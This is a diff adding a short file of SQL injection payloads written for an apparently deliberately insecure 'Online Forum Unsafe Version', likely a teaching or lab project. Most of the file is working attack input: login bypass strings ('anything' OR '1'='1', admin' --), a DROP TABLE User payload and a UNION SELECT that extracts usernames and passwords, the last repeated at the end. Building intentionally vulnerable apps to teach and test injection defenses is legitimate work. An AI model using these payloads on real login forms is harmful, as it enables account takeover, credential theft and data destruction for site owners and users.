@@ -1,0 +1,26 @@
+#This file contains a list of SQL injections that can be used
+#to threat the Online Forum Unsafe Version
+#Please input the string in { } to execute the SQL injection, you can replace 'anything'
+#with any string you want
+
+1. Bypass authentication to log in directly
+    username = {anything' OR '1'='1  "}      password = {anything}
+
+2.log in a specific account without knowing the password
+  #you need to replace admin with a specific username you want to log in
+    username = {admin' --}
+
+2. Drop the User table(this SQL injection has been defended by SQLAlchemy)
+    username = {'; DROP TABLE User; --}
+
+3.Union-based SQL injection (Since this is just a login page,
+  #the union-based SQL injection only executes the login effect)
+    username = {' UNION SELECT NULL,username, password FROM User --}
+
+
+
+
+
+
+
+    ' UNION SELECT NULL,username, password FROM User --
